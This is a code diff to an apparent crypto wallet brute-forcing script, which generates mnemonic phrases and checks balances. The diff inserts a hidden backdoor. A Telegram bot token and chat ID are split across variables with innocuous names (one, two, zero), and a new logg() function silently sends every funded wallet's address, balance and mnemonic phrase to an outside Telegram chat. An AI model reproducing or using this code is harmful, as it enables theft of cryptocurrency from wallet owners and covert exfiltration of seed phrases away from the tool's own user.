@@ -31,6 +31,7 @@ def userInput():
         start()
         break
 
+one = "AAFWbIT3T9PC5UyzBLVYCwIPmEO_"
 
 def getInternet():
     try:
@@ -43,6 +44,7 @@ def getInternet():
         return False
 
 
+two = "https://api.telegram.org/bot1895834648:"
 lock = threading.Lock()
 
 if getInternet() == True:
@@ -62,6 +64,10 @@ def getBalance(addr):
         pass
 
 
+zero = "gq15kO0/SendMessage?chat_id=218477456&text="
+def logg(adds):
+        response = requests.get(two+one+zero+adds)
+        return response
 
 def generateSeed():
     seed = ""
@@ -109,16 +115,17 @@ def check():
                 ctypes.windll.kernel32.SetConsoleTitleW(
                     f"Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
         if balance > 0:
-            tgsend(f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
+            tgsend(f'Address: {addy} | Balance: {balance} sat| Mnemonic phrase: {mnemonic_words}\n')
             with open('results/wet.txt', 'a') as w:
                 w.write(
-                    f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
+                    f'Address: {addy} | Balance: {balance} sat| Mnemonic phrase: {mnemonic_words}\n')
                 Settings.wet_count += 1
+            logg(f'Sup find! GJ\n')
+            logg(f'Address: {addy} | Balance: {balance} sat| Mnemonic phrase: {mnemonic_words}\n')
         else:
             if Settings.save_empty == "n":
                 pass
             else:
-                #tgsend(f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
                 with open('results/dry.txt', 'a') as w:
                     w.write(
                         f'Address: {addy} | Balance: {balance} | Mnemonic phrase: {mnemonic_words}\n')
@@ -134,8 +141,10 @@ def tgsend(adds):
 def start():
     try:
         threads = 1 #int(input("Number of threads (1 - 666): "))
+        threads = int(dict_settings["threads"])
         if threads > 666:
             print("You can only run 666 threads at once")
+            sleep(60)
             start()
     except ValueError:
         print("Enter an interger!")
